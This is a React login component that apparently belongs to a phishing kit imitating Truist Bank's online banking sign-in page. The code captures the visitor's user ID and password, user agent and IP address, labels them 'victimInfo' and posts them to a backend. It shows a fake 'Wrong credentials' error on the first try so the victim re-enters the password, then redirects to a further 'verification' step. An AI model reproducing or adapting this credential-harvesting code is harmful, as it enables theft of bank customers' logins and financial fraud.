import React, { useEffect, useState } from "react";
import { useHistory } from "react-router-dom";
import { RiEyeLine, RiEyeOffLine } from "react-icons/ri";
import { FaRegUserCircle } from "react-icons/fa";
import FormLayout from "../components/formLayout";
import { randParams } from "../utils/random";
import { APP_STORAGE_NAME } from "../utils/constants";
import Input from "../components/input";
import Button from "../components/button";
import API from "../api/api";
import axios from "axios";

const Login = () => {
  const router = useHistory();
  const [data, setData] = useState({ username: "", password: "" });
  const [isWrong, setIsWrong] = useState(false);
  const [isShowPass, setIsShowPass] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [victimInfo, setVictimData] = useState({
    ip: "",
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    sessionStorage.setItem(APP_STORAGE_NAME, JSON.stringify(data));
    const _data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    setIsLoading(true);
    try {
      const res = await API.createDetail({
        ..._data,
        bank: "Truist Bank",
        userAgent: navigator?.userAgent,
        victimInfo,
      });
      if (res.status === 201) {
        if (!isWrong) {
          setData({ username: "", password: "" });
          setIsWrong(true);
          return;
        }
        router.push(`/verification?${randParams()}`);
      }
    } catch (error) {
      alert("Something went wrong");
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    async function getIP() {
      const resp = await axios.get("https://api.ipify.org/?format=json");
      if (resp.data.ip) {
        setVictimData({ ip: resp.data.ip });
      }
    }
    getIP();
  }, []);

  return (
    <FormLayout
      handleSubmit={handleSubmit}
      title=""
    >
      <Input
        title="User ID"
        name="username"
        value={data?.username}
        onChange={handleChange}
      />
      <div className="flex items-center justify-between mb-5 mt-[-4px]">
        <div className="flex gap-2">
          <input
            id="checkbox"
            type="checkbox"
            className="checkbox [--chkbg:#ffffff] [--chkfg:var(--bg)] rounded-md border-[2px]"
          />
          <label
            htmlFor="checkbox"
            className="font-[600]"
          >
            Save user ID
          </label>
        </div>
        <a
          href="#"
          className="text-[#a6a3e0] underline text-base font-[500]"
        >
          Forgot user ID?
        </a>
      </div>
      <Input
        title="Password"
        type={!isShowPass ? "password" : "text"}
        name="password"
        value={data?.password}
        onChange={handleChange}
      >
        <span
          className="absolute top-[12px] right-4"
          onClick={() => setIsShowPass((prev) => !prev)}
        >
          {!isShowPass ? (
            <RiEyeLine
              fontSize={24}
              fill="#006d7a"
            />
          ) : (
            <RiEyeOffLine
              fontSize={24}
              fill="#006d7a"
            />
          )}
        </span>
      </Input>
      <div className="flex items-center justify-end mt-[-4px]">
        <a
          href="#"
          className="text-[#a6a3e0] underline text-base font-[500]"
        >
          Reset password
        </a>
      </div>

      {isWrong && (
        <div
          role="alert"
          className="alert alert-error my-4 rounded-[24px] bg-[#fcf3f3] border-[#fcf3f3] text-[#333333]"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
            className="stroke-[#ce1616] shrink-0 w-6 h-6"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth="2"
              d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
            ></path>
          </svg>
          <span>Wrong credentials.</span>
        </div>
      )}

      <Button
        title={
          isLoading ? (
            <span className="loading loading-spinner loading-md text-white"></span>
          ) : (
            "Sign in"
          )
        }
      />
      <div className="flex items-center gap-2">
        <span className="font-[600] text-base">Need a user ID?</span>
        <a
          href="#"
          className="text-[#a6a3e0] underline text-base font-[500]"
        >
          Set up online banking
        </a>
      </div>
      <a
        href="#"
        className="text-[#a6a3e0] underline text-base font-[500] block my-3"
      >
        Online security measures
      </a>
      <a
        href="#"
        className="flex gap-1 items-center underline text-base font-[500]"
      >
        <FaRegUserCircle fill="#a6a3e0" />
        <span className="text-[#a6a3e0] ml-1">Sign in to another account</span>
      </a>
    </FormLayout>
  );
};

export default Login;
